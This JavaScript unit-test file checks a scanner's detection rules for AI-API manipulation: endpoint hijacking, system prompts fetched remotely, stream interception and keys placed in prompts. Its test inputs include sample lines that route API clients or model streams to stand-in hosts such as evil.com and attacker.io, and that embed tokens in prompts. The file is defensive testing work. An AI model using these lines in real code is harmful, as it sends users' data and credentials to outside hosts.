/**
 * Model Manipulation Rules Unit Tests
 * Tests for AI API endpoint hijacking, model spoofing,
 * unsafe parameter manipulation, and related attacks.
 */

const { describe, test } = require('node:test');
const assert = require('node:assert');
const { rules } = require('../../dist/rules/model-manipulation.js');

function getRule(id) {
  const rule = rules.find(r => r.id === id);
  assert.ok(rule, `Rule ${id} not found`);
  return rule;
}

function matches(ruleId, content) {
  const rule = getRule(ruleId);
  rule.pattern.lastIndex = 0;
  return rule.pattern.test(content);
}

describe('Model Manipulation Rules', () => {

  // ============================================
  // API Endpoint Hijacking
  // ============================================
  describe('Endpoint Hijacking', () => {
    test('detects OpenAI base URL override to evil host', () => {
      assert.ok(matches('model-openai-base-url-override',
        'const client = new OpenAI({ baseURL: "https://evil.com/v1", apiKey: key });'));
    });

    test('does NOT flag official OpenAI base URL', () => {
      assert.ok(!matches('model-openai-base-url-override',
        'const client = new OpenAI({ baseURL: "https://api.openai.com/v1", apiKey: key });'));
    });

    test('detects OPENAI_BASE_URL env override to attacker IP', () => {
      assert.ok(matches('model-openai-base-url-override',
        'OPENAI_BASE_URL=http://192.168.1.100:8080'));
    });

    test('detects Anthropic base URL override', () => {
      assert.ok(matches('model-anthropic-base-url-override',
        'const client = new Anthropic({ baseURL: "https://attacker.io/v1" });'));
    });

    test('does NOT flag official Anthropic URL', () => {
      assert.ok(!matches('model-anthropic-base-url-override',
        'const client = new Anthropic({ baseURL: "https://api.anthropic.com" });'));
    });

    test('detects generic AI proxy to untrusted host', () => {
      assert.ok(matches('model-generic-ai-proxy',
        'const llmProxyUrl = "https://my-proxy.attacker.net/openai"'));
    });

    test('does NOT flag legitimate model in proxy context', () => {
      // The proxy variable itself pointing to openai is fine
      assert.ok(!matches('model-generic-ai-proxy',
        'const llmProxyUrl = "https://api.openai.com/v1"'));
    });
  });

  // ============================================
  // Model Identity Spoofing
  // ============================================
  describe('Model Identity Spoofing', () => {
    test('detects model name dynamically selected from request body', () => {
      assert.ok(matches('model-dynamic-selection',
        'const response = await openai.chat.completions.create({ model: req.body.model, messages });'));
    });

    test('detects model from env variable', () => {
      assert.ok(matches('model-dynamic-selection',
        'const model = process.env.AI_MODEL;'));
    });

    test('does NOT flag static model name', () => {
      assert.ok(!matches('model-dynamic-selection',
        'const model = "gpt-4o";'));
    });
  });

  // ============================================
  // Unsafe Parameter Manipulation
  // ============================================
  describe('Unsafe Parameter Manipulation', () => {
    test('detects extreme temperature 2.0', () => {
      assert.ok(matches('model-extreme-temperature',
        'const completion = await openai.chat({ temperature: 2.0, messages });'));
    });

    test('detects temperature 1.9', () => {
      assert.ok(matches('model-extreme-temperature', 'temperature: 1.9'));
    });

    test('detects negative temperature', () => {
      assert.ok(matches('model-extreme-temperature', 'temperature: -0.5'));
    });

    test('does NOT flag safe temperature 0.7', () => {
      assert.ok(!matches('model-extreme-temperature', 'temperature: 0.7'));
    });

    test('does NOT flag temperature 1.0 (boundary safe)', () => {
      assert.ok(!matches('model-extreme-temperature', 'temperature: 1.0'));
    });

    test('detects excessive max_tokens 1000000', () => {
      assert.ok(matches('model-excessive-max-tokens', 'max_tokens: 1000000'));
    });

    test('detects max_tokens 200000', () => {
      assert.ok(matches('model-excessive-max-tokens', 'max_tokens: 200000'));
    });

    test('does NOT flag reasonable max_tokens 4096', () => {
      assert.ok(!matches('model-excessive-max-tokens', 'max_tokens: 4096'));
    });

    test('does NOT flag max_tokens 99999', () => {
      assert.ok(!matches('model-excessive-max-tokens', 'max_tokens: 99999'));
    });

    test('detects top_p set to 0', () => {
      assert.ok(matches('model-top-p-zero', 'top_p: 0'));
    });

    test('detects top_p set to 0.0', () => {
      assert.ok(matches('model-top-p-zero', 'top_p: 0.0'));
    });

    test('does NOT flag top_p 0.9', () => {
      assert.ok(!matches('model-top-p-zero', 'top_p: 0.9'));
    });
  });

  // ============================================
  // System Prompt Injection
  // ============================================
  describe('System Prompt Injection', () => {
    test('detects system prompt loaded from env var', () => {
      assert.ok(matches('model-system-prompt-from-env',
        'const systemPrompt = process.env.SYSTEM_PROMPT;'));
    });

    test('detects content loaded from SYSTEM_PROMPT env var', () => {
      assert.ok(matches('model-system-prompt-from-env',
        'messages: [{ role: "system", content: process.env.SYSTEM_PROMPT }]'));
    });

    test('does NOT flag hardcoded system prompt', () => {
      assert.ok(!matches('model-system-prompt-from-env',
        'const system = "You are a helpful assistant.";'));
    });

    test('detects system prompt fetched from remote URL', () => {
      assert.ok(matches('model-system-prompt-from-url',
        'const systemPrompt = await fetch("https://evil.com/prompts/jailbreak.txt").then(r => r.text());'));
    });

    test('detects system: axios.get remote prompt', () => {
      assert.ok(matches('model-system-prompt-from-url',
        'const system = await axios.get("https://attacker.io/system.md")'));
    });
  });

  // ============================================
  // Streaming Interception
  // ============================================
  describe('Streaming Interception', () => {
    test('detects stream piped to https socket', () => {
      assert.ok(matches('model-stream-intercept',
        'stream.pipe(https.request({ host: "evil.com" }))'));
    });

    test('detects readable.pipeTo with tls connect', () => {
      assert.ok(matches('model-stream-intercept',
        'readable.pipeTo(tls.connect(443, "attacker.io"))'));
    });
  });

  // ============================================
  // Response Format Injection
  // ============================================
  describe('Response Format Injection', () => {
    test('detects response_format from request body', () => {
      assert.ok(matches('model-response-format-injection',
        'response_format: JSON.parse(req.body.format)'));
    });

    test('detects response_format from params', () => {
      assert.ok(matches('model-response-format-injection',
        'response_format: params.schema'));
    });

    test('does NOT flag hardcoded response_format', () => {
      assert.ok(!matches('model-response-format-injection',
        'response_format: { type: "json_object" }'));
    });
  });

  // ============================================
  // API Key Exfiltration via LLM
  // ============================================
  describe('API Key Exfiltration via LLM', () => {
    test('detects OpenAI key embedded in prompt', () => {
      assert.ok(matches('model-key-in-prompt',
        'const prompt = `Summarize: ${data}. Key: sk-abcdefghijklmnopqrstuvwx`;'));
    });

    test('detects AWS access key in prompt content', () => {
      assert.ok(matches('model-key-in-prompt',
        'messages: [{ role: "user", content: "AKIAIOSFODNN7EXAMPLE is the key" }]'));
    });

    test('detects secret env var interpolated into prompt template', () => {
      assert.ok(matches('model-env-key-forwarded-to-llm',
        'const prompt = `Use this key: ${process.env.OPENAI_API_KEY} to help`;'));
    });

    test('detects TOKEN env var in prompt', () => {
      assert.ok(matches('model-env-key-forwarded-to-llm',
        'content: `Your token is ${process.env.GITHUB_TOKEN}`'));
    });

    test('does NOT flag non-secret env var in prompt', () => {
      assert.ok(!matches('model-env-key-forwarded-to-llm',
        'content: `User name: ${process.env.USER_NAME}`'));
    });
  });

  // ============================================
  // Model Capability Bypass
  // ============================================
  describe('Model Capability Bypass via Function Calling', () => {
    test('detects execute_code function definition', () => {
      assert.ok(matches('model-unrestricted-function-calling',
        'tools: [{ type: "function", function: { name: "execute_code", description: "Run code" } }]'));
    });

    test('detects run_command function', () => {
      assert.ok(matches('model-unrestricted-function-calling',
        '{ "name": "run_command", "description": "Execute shell command" }'));
    });

    test('detects exec_shell function', () => {
      assert.ok(matches('model-unrestricted-function-calling',
        '"name": "exec_shell"'));
    });

    test('does NOT flag safe function name', () => {
      assert.ok(!matches('model-unrestricted-function-calling',
        '"name": "get_weather"'));
    });

    test('does NOT flag search function', () => {
      assert.ok(!matches('model-unrestricted-function-calling',
        '{ "name": "search_web", "description": "Search the web" }'));
    });
  });

  // ============================================
  // Rule metadata validation
  // ============================================
  describe('Rule metadata', () => {
    test('all rules have required fields', () => {
      for (const rule of rules) {
        assert.ok(rule.id, `Rule missing id`);
        assert.ok(rule.severity, `Rule ${rule.id} missing severity`);
        assert.ok(rule.description, `Rule ${rule.id} missing description`);
        assert.ok(rule.pattern instanceof RegExp, `Rule ${rule.id} pattern is not RegExp`);
        assert.ok(rule.recommendation, `Rule ${rule.id} missing recommendation`);
      }
    });

    test('all rule IDs are unique', () => {
      const ids = rules.map(r => r.id);
      const unique = new Set(ids);
      assert.strictEqual(ids.length, unique.size, 'Duplicate rule IDs found');
    });

    test('all rules have category set to model-manipulation', () => {
      for (const rule of rules) {
        assert.strictEqual(rule.category, 'model-manipulation',
          `Rule ${rule.id} missing or wrong category`);
      }
    });
  });
});
